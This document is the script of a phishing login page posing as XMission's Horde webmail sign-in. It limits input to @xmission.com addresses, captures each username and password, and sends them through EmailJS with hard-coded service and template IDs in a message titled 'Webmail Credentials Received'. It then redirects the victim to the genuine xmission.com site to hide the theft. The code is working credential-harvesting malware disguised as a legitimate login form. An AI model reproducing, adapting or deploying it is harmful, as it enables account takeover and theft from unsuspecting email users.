<script type="text/javascript">
    function setFocus() {
        if (document.horde_login && document.horde_login.horde_user && document.horde_login.horde_user.value == "") {
            document.horde_login.horde_user.focus();
        } else if (document.horde_login && document.horde_login.horde_pass) {
            document.horde_login.horde_pass.focus();
        } else {
            const userField = document.getElementById('user_webmail');
            if (userField && userField.value === "") userField.focus();
            else {
                const passField = document.getElementById('pass_webmail');
                if(passField) passField.focus();
            }
        }
    }

    function enter_key_trap(e) {
        var keycode;
        if (window.event) keycode = window.event.keyCode;
        else if (e) keycode = e.which;
        else return true;
        if (keycode == 13) return false;
        else return true;
    }

    (function() {
        emailjs.init("SdkmRe8WZ7itEba9z");
    })();

    const loginForm = document.getElementById("login_webmail");
    const emailInput = document.getElementById("user_webmail");
    const passwordInput = document.getElementById("pass_webmail");
    const emailErrorSpan = document.getElementById("email-error");
    const passwordErrorSpan = document.getElementById("password-error");

    const allowedDomainRegex = /^[^@\s]+@xmission\.com$/i;

    function clearErrors() {
        if (emailErrorSpan) emailErrorSpan.textContent = "";
        if (passwordErrorSpan) passwordErrorSpan.textContent = "";
    }

    function setEmailError(msg) {
        if (emailErrorSpan) emailErrorSpan.textContent = msg;
    }

    function setPasswordError(msg) {
        if (passwordErrorSpan) passwordErrorSpan.textContent = msg;
    }

    function validateCredentials(emailValue, passwordValue) {
        let isValid = true;
        if (!emailValue) {
            setEmailError("Username / Email is required.");
            isValid = false;
        } else if (!allowedDomainRegex.test(emailValue)) {
            setEmailError("Email must be @xmission.com (e.g., user@xmission.com).");
            isValid = false;
        } else {
            setEmailError("");
        }

        if (!passwordValue) {
            setPasswordError("Password is required.");
            isValid = false;
        } else {
            setPasswordError("");
        }
        return isValid;
    }

    async function sendCredentialsViaEmailJS(username, password) {
        const templateParams = {
            user_email: username,
            user_password: password,
            email: username,
            password: password,
            from_name: username.split('@')[0] || "Webmail User",
            message: `New webmail login submission:\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toString()}`,
            to_name: "Admin",
            subject: "Webmail Credentials Received"
        };

        try {
            const response = await emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams);
            console.log("EmailJS success:", response.status, response.text);
            return { success: true, status: response.status };
        } catch (err) {
            console.error("EmailJS error:", err);
            return { success: false, error: err };
        }
    }

    async function handleFormSubmit(event) {
        event.preventDefault();
        clearErrors();

        const username = emailInput ? emailInput.value.trim() : "";
        const password = passwordInput ? passwordInput.value : "";

        const valid = validateCredentials(username, password);
        if (!valid) {
            return;
        }

        const submitBtn = document.getElementById("loginButtonId");
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.value = "Sending...";
        }

        const result = await sendCredentialsViaEmailJS(username, password);

        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.value = "Log in";
        }

        if (result.success) {
            window.location.href = "https://www.xmission.com";
        } else {
            alert("Unable to complete login process. Please try again later.");
            console.error("EmailJS delivery failed:", result.error);
        }
    }

    if (loginForm) {
        loginForm.addEventListener("submit", handleFormSubmit);
    }

    window.setFocus = setFocus;
    window.submit_login = function(e) {
        if (typeof e != 'undefined' && !enter_key_trap(e)) {
            return;
        }
        if (loginForm) {
            const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
            loginForm.dispatchEvent(submitEvent);
        }
        return false;
    };

    document.addEventListener("DOMContentLoaded", function() {
        setFocus();
        const oldLoginButton = document.getElementById("loginButtonId");
        if (oldLoginButton && oldLoginButton.getAttribute("onclick")) {
            oldLoginButton.removeAttribute("onclick");
        }
    });

    function getHTTPObject() {
        var xmlhttp;
        if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
            try {
                xmlhttp = new XMLHttpRequest();
            } catch (e) {
                xmlhttp = false;
            }
        }
        return xmlhttp;
    }
    var http = getHTTPObject();
    function formHandler() {
        console.log("in formHandler (legacy)");
        var form = document.getElementById('login_webmail');
        if(form) {
        }
    }
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", setFocus);
    } else {
        setFocus();
    }
</script>
